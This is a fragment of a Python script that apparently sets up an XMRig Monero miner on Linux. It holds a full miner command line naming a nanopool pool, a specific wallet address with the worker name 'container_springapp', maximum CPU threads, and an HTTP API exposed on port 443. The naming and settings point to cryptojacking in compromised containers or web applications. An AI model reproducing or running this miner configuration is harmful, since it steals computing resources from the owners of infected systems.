...
if operate_system == 'lin':
    ...
    try:
        ...
        pass
import psutil
command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf.container_springapp -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=443 -t %s' %cores
